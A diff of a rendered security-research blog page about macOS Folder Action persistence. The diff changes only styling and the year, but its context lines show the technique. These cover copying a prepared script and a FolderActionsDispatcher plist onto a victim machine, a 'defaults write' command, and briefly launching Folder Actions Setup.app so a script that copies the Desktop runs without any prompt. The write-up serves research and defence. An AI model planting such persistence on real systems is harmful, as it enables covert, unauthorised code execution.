@@ -63,7 +63,7 @@ Folder action persistence has been documented by Cody Thomas back in 2019 in his
   
     
     
-    <link rel="stylesheet" href="https://theevilbit.github.io/css/coder-dark.min.a00e6364bacbc8266ad1cc81230774a1397198f8cfb7bcba29b7d6fcb54ce57f.css" integrity="sha256-oA5jZLrLyCZq0cyBIwd0oTlxmPjPt7y6KbfW/LVM5X8=" crossorigin="anonymous" media="screen" />
+    <link rel="stylesheet" href="https://theevilbit.github.io/css/coder-dark.min.ad48f476275974885bdc03d5251e3cdbe1678c54a63ff772376b0ed2adc468dd.css" integrity="sha256-rUj0didZdIhb3APVJR482&#43;FnjFSmP/dyN2sO0q3EaN0=" crossorigin="anonymous" media="screen" />
   
 
 
@@ -189,7 +189,7 @@ Folder action persistence has been documented by Cody Thomas back in 2019 in his
 </h2>
 <p>As described by Cody the default location for the scripts is <code>/Library/Scripts/Folder Action Scripts</code> and <code>~/Library/Scripts/Folder Action Scripts</code>. The other important item he described is that the action script configuration can be found in the file <code>~/Library/Preferences/com.apple.FolderActionsDispatcher.plist</code>. This PLIST contains even more embedded PLISTs in base64 encoded format.</p>
 <p>Let&rsquo;s start by creating a Folder Action through the GUI, for a folder <code>~/test</code> and attach the script <code>~/Library/Scripts/Folder Action Scripts/folderaction.scpt</code>. This is what we get as a result.</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#099">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#099">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
 </span></span><span style="display:flex;"><span><span style="color:#099">&lt;!DOCTYPE plist PUBLIC &#34;-//Apple//DTD PLIST 1.0//EN&#34; &#34;http://www.apple.com/DTDs/PropertyList-1.0.dtd&#34;&gt;</span>
 </span></span><span style="display:flex;"><span><span style="color:#309;font-weight:bold">&lt;plist</span> <span style="color:#309">version=</span><span style="color:#c30">&#34;1.0&#34;</span><span style="color:#309;font-weight:bold">&gt;</span>
 </span></span><span style="display:flex;"><span><span style="color:#309;font-weight:bold">&lt;dict&gt;</span>
@@ -251,7 +251,7 @@ Folder action persistence has been documented by Cody Thomas back in 2019 in his
 </span></span><span style="display:flex;"><span><span style="color:#309;font-weight:bold">&lt;/dict&gt;</span>
 </span></span><span style="display:flex;"><span><span style="color:#309;font-weight:bold">&lt;/plist&gt;</span>
 </span></span></code></pre></div><p>This is not too informative. We can decode the base64 data, and get a binary plist. If we convert it to XML we get the following.</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#099">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#099">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
 </span></span><span style="display:flex;"><span><span style="color:#099">&lt;!DOCTYPE plist PUBLIC &#34;-//Apple//DTD PLIST 1.0//EN&#34; &#34;http://www.apple.com/DTDs/PropertyList-1.0.dtd&#34;&gt;</span>
 </span></span><span style="display:flex;"><span><span style="color:#309;font-weight:bold">&lt;plist</span> <span style="color:#309">version=</span><span style="color:#c30">&#34;1.0&#34;</span><span style="color:#309;font-weight:bold">&gt;</span>
 </span></span><span style="display:flex;"><span><span style="color:#309;font-weight:bold">&lt;dict&gt;</span>
@@ -447,21 +447,21 @@ Folder action persistence has been documented by Cody Thomas back in 2019 in his
 <p>I didn&rsquo;t want to fully reverse the structure of this plist, but simply take a shortcut. We can setup a folder action script on our machine, like the above and take it to the victim.</p>
 <p>Taking the above plist we can overwrite the one on the machine. There is zero protection on the file, so we can freely do that.</p>
 <p>So the manual setup is to copy our script to its location, create the folder we want to watch (if it doesn&rsquo;t exists), and overwrite preferences.</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>csaby@mantarey ~ % mkdir -p <span style="color:#c30">&#34;Library/Scripts/Folder Action Scripts&#34;</span>
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>csaby@mantarey ~ % mkdir -p <span style="color:#c30">&#34;Library/Scripts/Folder Action Scripts&#34;</span>
 </span></span><span style="display:flex;"><span>csaby@mantarey ~ % cp folderaction.scpt <span style="color:#c30">&#34;Library/Scripts/Folder Action Scripts/&#34;</span> 
 </span></span><span style="display:flex;"><span>csaby@mantarey ~ % mkdir <span style="color:#366">test</span>
 </span></span><span style="display:flex;"><span>csaby@mantarey ~ % cp com.apple.FolderActionsDispatcher.plist Library/Preferences 
 </span></span></code></pre></div><p>We could also do something like this to edit the preferences file:</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>defaults write <span style="color:#c30">&#34;com.apple.FolderActionsDispatcher&#34;</span> <span style="color:#c30">&#34;folderActions&#34;</span> <span style="color:#c30">&#39;&#34;{length = 2513, bytes = 0x62706c69 73743030 d4010203 04050607 ... 00000000 00000935 }&#34;&#39;</span>
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>defaults write <span style="color:#c30">&#34;com.apple.FolderActionsDispatcher&#34;</span> <span style="color:#c30">&#34;folderActions&#34;</span> <span style="color:#c30">&#39;&#34;{length = 2513, bytes = 0x62706c69 73743030 d4010203 04050607 ... 00000000 00000935 }&#34;&#39;</span>
 </span></span></code></pre></div><p>In this case, for the example, our folder action script does the following:</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#069;font-weight:bold">var</span> app <span style="color:#555">=</span> Application.currentApplication();
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#069;font-weight:bold">var</span> app <span style="color:#555">=</span> Application.currentApplication();
 </span></span><span style="display:flex;"><span>app.includeStandardAdditions <span style="color:#555">=</span> <span style="color:#069;font-weight:bold">true</span>;
 </span></span><span style="display:flex;"><span>app.doShellScript(<span style="color:#c30">&#34;touch /tmp/folderaction.txt&#34;</span>);
 </span></span><span style="display:flex;"><span>app.doShellScript(<span style="color:#c30">&#34;touch ~/Desktop/folderaction.txt&#34;</span>);
 </span></span><span style="display:flex;"><span>app.doShellScript(<span style="color:#c30">&#34;cp -R ~/Desktop /tmp/&#34;</span>);
 </span></span></code></pre></div><p>Now if we do anything in the folder&hellip;. nothing happens. :(</p>
 <p>There is one more thing we need to do. The preference file has to be consumed, and for that we need to start the <code>Folder Action Setup.app</code> utility, which we can kill after.</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>csaby@mantarey ~ % open <span style="color:#c30">&#34;/System/Library/CoreServices/Applications/Folder Actions Setup.app/&#34;</span>                                 
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>csaby@mantarey ~ % open <span style="color:#c30">&#34;/System/Library/CoreServices/Applications/Folder Actions Setup.app/&#34;</span>                                 
 </span></span><span style="display:flex;"><span>csaby@mantarey ~ % killall <span style="color:#c30">&#34;Folder Actions Setup&#34;</span>
 </span></span></code></pre></div><p>Now if we do anything with it in Finder, the script will be triggered. All of this without any user prompt.</p>
 <p>Someone can either prepare a PLIST file upfront as I did here, or reverse it and programmatically do it. I didn&rsquo;t do that, but if anyone does I would be interested seeing that :)</p>
@@ -519,7 +519,7 @@ Internal requirements count=1 size=84
     
       2019 -
     
-    2025
+    2026
      Csaba Fitzl 
     ·
     
